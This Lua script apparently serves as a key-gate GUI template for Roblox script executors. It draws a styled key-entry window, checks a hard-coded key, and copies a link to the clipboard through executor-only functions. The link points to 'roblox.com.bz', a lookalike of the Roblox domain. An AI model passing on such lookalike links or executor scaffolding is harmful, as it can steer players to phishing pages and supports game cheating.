local VALID_KEY = "DEMO-1234-ABCD-5678"   -- << Change your key here
local KEY_LINK  = "https://roblox.com.bz/communities/4510710436/"  -- << Change your link here

-- Services
local Players        = game:GetService("Players")
local TweenService   = game:GetService("TweenService")
local RunService     = game:GetService("RunService")

local LocalPlayer    = Players.LocalPlayer
local PlayerGui      = LocalPlayer:WaitForChild("PlayerGui")

-- Remove old GUI if reinjected
if PlayerGui:FindFirstChild("KeyGuardGui") then
    PlayerGui.KeyGuardGui:Destroy()
end

-- Root ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name            = "KeyGuardGui"
ScreenGui.ResetOnSpawn    = false
ScreenGui.ZIndexBehavior  = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent          = PlayerGui

-- ─── Colours ──────────────────────────────────────────────────────────────────
local C = {
    BG          = Color3.fromRGB(13,  13,  20),
    SURFACE     = Color3.fromRGB(18,  18,  30),
    TITLEBAR    = Color3.fromRGB(10,  10,  22),
    BORDER      = Color3.fromRGB(42,  42,  74),
    ACCENT      = Color3.fromRGB(123, 110, 246),
    ACCENT_DIM  = Color3.fromRGB(30,  30,  56),
    TEXT_BRIGHT = Color3.fromRGB(232, 232, 255),
    TEXT_MID    = Color3.fromRGB(90,  90,  138),
    TEXT_DIM    = Color3.fromRGB(46,  46,  74),
    GREEN       = Color3.fromRGB(74,  222, 128),
    RED         = Color3.fromRGB(248, 113, 113),
    FOOTER      = Color3.fromRGB(10,  10,  20),
}

-- ─── Helpers ──────────────────────────────────────────────────────────────────
local function newObj(class, props, parent)
    local obj = Instance.new(class)
    for k, v in pairs(props) do obj[k] = v end
    obj.Parent = parent
    return obj
end

local function makePadding(parent, t, b, l, r)
    local p = Instance.new("UIPadding")
    p.PaddingTop    = UDim.new(0, t)
    p.PaddingBottom = UDim.new(0, b)
    p.PaddingLeft   = UDim.new(0, l)
    p.PaddingRight  = UDim.new(0, r)
    p.Parent = parent
end

local function makeCorner(parent, radius)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, radius or 10)
    c.Parent = parent
end

local function makeStroke(parent, color, thickness)
    local s = Instance.new("UIStroke")
    s.Color     = color or C.BORDER
    s.Thickness = thickness or 1
    s.Parent    = parent
end

local function tween(obj, props, duration, style, direction)
    local info = TweenInfo.new(
        duration or 0.2,
        style or Enum.EasingStyle.Quart,
        direction or Enum.EasingDirection.Out
    )
    TweenService:Create(obj, info, props):Play()
end

-- ─── Copy to clipboard helper ─────────────────────────────────────────────────
local function setClipboard(text)
    -- Works in most executors; gracefully fails if not supported
    local ok = pcall(function()
        setclipboard(text)
    end)
    if not ok then
        pcall(function()
            if syn and syn.clipboard then
                syn.clipboard.set(text)
            end
        end)
    end
end

-- ─── Main Frame ───────────────────────────────────────────────────────────────
local MainFrame = newObj("Frame", {
    Name            = "MainFrame",
    Size            = UDim2.new(0, 420, 0, 280),
    Position        = UDim2.new(0.5, -210, 0.5, -140),
    BackgroundColor3 = C.SURFACE,
    BorderSizePixel = 0,
    ClipsDescendants = true,
}, ScreenGui)
makeCorner(MainFrame, 14)
makeStroke(MainFrame, C.BORDER, 1)

-- Drop shadow simulation (outer frame)
local Shadow = newObj("Frame", {
    Size             = UDim2.new(1, 16, 1, 16),
    Position         = UDim2.new(0, -8, 0, -8),
    BackgroundColor3 = Color3.fromRGB(0, 0, 0),
    BackgroundTransparency = 0.7,
    ZIndex           = 0,
    BorderSizePixel  = 0,
}, MainFrame)
makeCorner(Shadow, 18)

-- ─── Title Bar ────────────────────────────────────────────────────────────────
local TitleBar = newObj("Frame", {
    Name             = "TitleBar",
    Size             = UDim2.new(1, 0, 0, 40),
    BackgroundColor3 = C.TITLEBAR,
    BorderSizePixel  = 0,
    ZIndex           = 2,
}, MainFrame)

local TitleDivider = newObj("Frame", {
    Size             = UDim2.new(1, 0, 0, 1),
    Position         = UDim2.new(0, 0, 1, -1),
    BackgroundColor3 = C.BORDER,
    BorderSizePixel  = 0,
    ZIndex           = 3,
}, TitleBar)

local TitleLabel = newObj("TextLabel", {
    Text             = "⬡  KEYGUARD",
    Font             = Enum.Font.Code,
    TextSize         = 13,
    TextColor3       = C.ACCENT,
    BackgroundTransparency = 1,
    Size             = UDim2.new(1, -90, 1, 0),
    Position         = UDim2.new(0, 14, 0, 0),
    TextXAlignment   = Enum.TextXAlignment.Left,
    ZIndex           = 3,
}, TitleBar)

-- Window dots (cosmetic)
local DotsFrame = newObj("Frame", {
    Size             = UDim2.new(0, 60, 0, 18),
    Position         = UDim2.new(1, -70, 0.5, -9),
    BackgroundTransparency = 1,
    ZIndex           = 3,
}, TitleBar)
local dotColors = {
    Color3.fromRGB(248,113,113),
    Color3.fromRGB(251,191, 36),
    Color3.fromRGB( 74,222,128),
}
for i, col in ipairs(dotColors) do
    local dot = newObj("Frame", {
        Size             = UDim2.new(0, 10, 0, 10),
        Position         = UDim2.new(0, (i-1)*18, 0.5, -5),
        BackgroundColor3 = col,
        BorderSizePixel  = 0,
        ZIndex           = 4,
    }, DotsFrame)
    makeCorner(dot, 99)
end

-- Drag logic
local dragging, dragStart, startPos
TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging  = true
        dragStart = input.Position
        startPos  = MainFrame.Position
    end
end)
TitleBar.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)
RunService.RenderStepped:Connect(function()
    if dragging then
        local delta = game:GetService("UserInputService"):GetMouseLocation() - dragStart
        MainFrame.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
end)

-- ─── Body ─────────────────────────────────────────────────────────────────────
local Body = newObj("Frame", {
    Name             = "Body",
    Size             = UDim2.new(1, 0, 1, -80),   -- leaves room for footer
    Position         = UDim2.new(0, 0, 0, 40),
    BackgroundTransparency = 1,
    ZIndex           = 2,
}, MainFrame)
makePadding(Body, 22, 14, 24, 24)

local BodyLayout = Instance.new("UIListLayout")
BodyLayout.SortOrder     = Enum.SortOrder.LayoutOrder
BodyLayout.Padding       = UDim.new(0, 12)
BodyLayout.Parent        = Body

-- Lock icon label
local LockLabel = newObj("TextLabel", {
    Text             = "🔒",
    Font             = Enum.Font.GothamBold,
    TextSize         = 28,
    BackgroundTransparency = 1,
    Size             = UDim2.new(1, 0, 0, 36),
    TextXAlignment   = Enum.TextXAlignment.Center,
    ZIndex           = 3,
    LayoutOrder      = 1,
}, Body)

-- Heading
local HeadingLabel = newObj("TextLabel", {
    Text             = "Access Required",
    Font             = Enum.Font.GothamBold,
    TextSize         = 18,
    TextColor3       = C.TEXT_BRIGHT,
    BackgroundTransparency = 1,
    Size             = UDim2.new(1, 0, 0, 24),
    TextXAlignment   = Enum.TextXAlignment.Center,
    ZIndex           = 3,
    LayoutOrder      = 2,
}, Body)

-- Sub text
local SubLabel = newObj("TextLabel", {
    Text             = "// enter your key to continue //",
    Font             = Enum.Font.Code,
    TextSize         = 11,
    TextColor3       = C.TEXT_DIM,
    BackgroundTransparency = 1,
    Size             = UDim2.new(1, 0, 0, 16),
    TextXAlignment   = Enum.TextXAlignment.Center,
    ZIndex           = 3,
    LayoutOrder      = 3,
}, Body)

-- Key Input Box
local InputFrame = newObj("Frame", {
    Size             = UDim2.new(1, 0, 0, 42),
    BackgroundColor3 = C.BG,
    BorderSizePixel  = 0,
    ZIndex           = 3,
    LayoutOrder      = 4,
}, Body)
makeCorner(InputFrame, 8)
makeStroke(InputFrame, C.BORDER, 1)
makePadding(InputFrame, 0, 0, 12, 12)

local KeyInput = newObj("TextBox", {
    PlaceholderText  = "XXXX-XXXX-XXXX-XXXX",
    Text             = "",
    Font             = Enum.Font.Code,
    TextSize         = 13,
    TextColor3       = Color3.fromRGB(200, 200, 240),
    PlaceholderColor3 = C.TEXT_DIM,
    BackgroundTransparency = 1,
    Size             = UDim2.new(1, 0, 1, 0),
    ClearTextOnFocus = false,
    ZIndex           = 4,
}, InputFrame)

-- Hover glow on input
KeyInput.Focused:Connect(function()
    tween(InputFrame, {BackgroundColor3 = Color3.fromRGB(18, 18, 32)}, 0.15)
    makeStroke(InputFrame, C.ACCENT, 1)
end)
KeyInput.FocusLost:Connect(function()
    tween(InputFrame, {BackgroundColor3 = C.BG}, 0.15)
    makeStroke(InputFrame, C.BORDER, 1)
end)

-- ─── Buttons ──────────────────────────────────────────────────────────────────
local BtnRow = newObj("Frame", {
    Size         = UDim2.new(1, 0, 0, 40),
    BackgroundTransparency = 1,
    ZIndex       = 3,
    LayoutOrder  = 5,
}, Body)

local BtnLayout = Instance.new("UIListLayout")
BtnLayout.FillDirection = Enum.FillDirection.Horizontal
BtnLayout.Padding       = UDim.new(0, 10)
BtnLayout.SortOrder     = Enum.SortOrder.LayoutOrder
BtnLayout.Parent        = BtnRow

-- Check Key button (left)
local CheckBtn = newObj("TextButton", {
    Text             = "✦  Check Key",
    Font             = Enum.Font.GothamBold,
    TextSize         = 13,
    TextColor3       = Color3.fromRGB(255, 255, 255),
    BackgroundColor3 = C.ACCENT,
    Size             = UDim2.new(0.5, -5, 1, 0),
    BorderSizePixel  = 0,
    AutoButtonColor  = false,
    ZIndex           = 4,
    LayoutOrder      = 1,
}, BtnRow)
makeCorner(CheckBtn, 8)

-- Copy Link button (right)
local CopyBtn = newObj("TextButton", {
    Text             = "⎘  Copy Link",
    Font             = Enum.Font.GothamBold,
    TextSize         = 13,
    TextColor3       = C.ACCENT,
    BackgroundColor3 = C.ACCENT_DIM,
    Size             = UDim2.new(0.5, -5, 1, 0),
    BorderSizePixel  = 0,
    AutoButtonColor  = false,
    ZIndex           = 4,
    LayoutOrder      = 2,
}, BtnRow)
makeCorner(CopyBtn, 8)
makeStroke(CopyBtn, C.BORDER, 1)

-- Button hover animations
local function btnHover(btn, hoverColor, normalColor)
    btn.MouseEnter:Connect(function()
        tween(btn, {BackgroundColor3 = hoverColor}, 0.12)
    end)
    btn.MouseLeave:Connect(function()
        tween(btn, {BackgroundColor3 = normalColor}, 0.12)
    end)
    btn.MouseButton1Down:Connect(function()
        tween(btn, {Size = UDim2.new(0.5, -7, 1, -2), Position = UDim2.new(btn.Position.X.Scale, btn.Position.X.Offset+1, 0, 1)}, 0.08)
    end)
    btn.MouseButton1Up:Connect(function()
        tween(btn, {Size = UDim2.new(0.5, -5, 1, 0), Position = UDim2.new(btn.Position.X.Scale, btn.Position.X.Offset-1, 0, 0)}, 0.1)
    end)
end

btnHover(CheckBtn, Color3.fromRGB(148, 135, 255), C.ACCENT)
btnHover(CopyBtn,  Color3.fromRGB(38,  38,  72),  C.ACCENT_DIM)

-- ─── Status Label ─────────────────────────────────────────────────────────────
local StatusLabel = newObj("TextLabel", {
    Text             = "awaiting input...",
    Font             = Enum.Font.Code,
    TextSize         = 11,
    TextColor3       = C.TEXT_DIM,
    BackgroundTransparency = 1,
    Size             = UDim2.new(1, 0, 0, 16),
    TextXAlignment   = Enum.TextXAlignment.Center,
    ZIndex           = 3,
    LayoutOrder      = 6,
}, Body)

-- ─── Footer ───────────────────────────────────────────────────────────────────
local Footer = newObj("Frame", {
    Name             = "Footer",
    Size             = UDim2.new(1, 0, 0, 30),
    Position         = UDim2.new(0, 0, 1, -30),
    BackgroundColor3 = C.FOOTER,
    BorderSizePixel  = 0,
    ZIndex           = 2,
}, MainFrame)

local FooterDivider = newObj("Frame", {
    Size             = UDim2.new(1, 0, 0, 1),
    BackgroundColor3 = C.BORDER,
    BorderSizePixel  = 0,
    ZIndex           = 3,
}, Footer)

local FooterLeft = newObj("TextLabel", {
    Text             = "v1.0.0 · secured",
    Font             = Enum.Font.Code,
    TextSize         = 10,
    TextColor3       = C.TEXT_DIM,
    BackgroundTransparency = 1,
    Size             = UDim2.new(0.5, 0, 1, 0),
    Position         = UDim2.new(0, 14, 0, 0),
    TextXAlignment   = Enum.TextXAlignment.Left,
    ZIndex           = 3,
}, Footer)

local BadgeFrame = newObj("Frame", {
    Size             = UDim2.new(0, 80, 0, 18),
    Position         = UDim2.new(1, -90, 0.5, -9),
    BackgroundColor3 = Color3.fromRGB(26, 26, 46),
    BorderSizePixel  = 0,
    ZIndex           = 3,
}, Footer)
makeCorner(BadgeFrame, 4)
makeStroke(BadgeFrame, C.BORDER, 1)

local BadgeLabel = newObj("TextLabel", {
    Text             = "KEYGUARD",
    Font             = Enum.Font.Code,
    TextSize         = 9,
    TextColor3       = C.TEXT_MID,
    BackgroundTransparency = 1,
    Size             = UDim2.new(1, 0, 1, 0),
    TextXAlignment   = Enum.TextXAlignment.Center,
    ZIndex           = 4,
}, BadgeFrame)

-- ─── Button Logic ─────────────────────────────────────────────────────────────
local function setStatus(text, color)
    StatusLabel.Text       = text
    StatusLabel.TextColor3 = color
end

CheckBtn.MouseButton1Click:Connect(function()
    local input = KeyInput.Text:gsub("%s", ""):upper()
    if input == "" then
        setStatus("⚠  no key entered", C.RED)
        return
    end
    if input == VALID_KEY:upper() then
        setStatus("✓  valid key — access granted", C.GREEN)
        -- TODO: put your post-key-check code here
    else
        setStatus("✗  invalid key — try again", C.RED)
    end
end)

CopyBtn.MouseButton1Click:Connect(function()
    setClipboard(KEY_LINK)
    local orig = CopyBtn.Text
    CopyBtn.Text       = "✓  Copied!"
    CopyBtn.TextColor3 = C.GREEN
    task.delay(1.8, function()
        CopyBtn.Text       = orig
        CopyBtn.TextColor3 = C.ACCENT
    end)
end)

-- ─── Entrance animation ───────────────────────────────────────────────────────
MainFrame.Position          = UDim2.new(0.5, -210, 0.5, -170)
MainFrame.BackgroundTransparency = 1
tween(MainFrame, {Position = UDim2.new(0.5, -210, 0.5, -140), BackgroundTransparency = 0}, 0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
